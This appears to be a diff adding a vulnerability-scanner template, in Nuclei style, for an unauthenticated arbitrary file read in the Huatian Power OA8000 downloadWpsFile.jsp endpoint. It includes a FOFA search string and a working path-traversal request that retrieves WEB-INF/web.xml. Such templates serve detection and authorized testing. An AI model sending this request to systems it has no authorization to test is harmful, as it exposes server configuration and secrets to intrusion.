@@ -1,0 +1,30 @@
+id: huatianOA-downloadWpsFile-File-reading
+
+info:
+  name: 华天动力OA downloadWpsFile.jsp 任意文件读取漏洞
+  author: unknown
+  severity: high
+  description: |-
+    fofa: app="华天动力-OA8000"
+    华天动力OA downloadWpsFile.jsp 接口处存在任意文件读取漏洞，未经身份认证的攻击者可利用此漏洞获取服务器内部敏感文件，使系统处于极不安全的状态。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/140824564
+  tags: File reading
+
+
+
+http:
+  - raw:
+      - |
+        GET /OAapp/jsp/downloadWpsFile.jsp?fileName=../../../../../../htoa/Tomcat/webapps/ROOT/WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version="1.0"'
+      - type: status
+        status: 
+          - 200
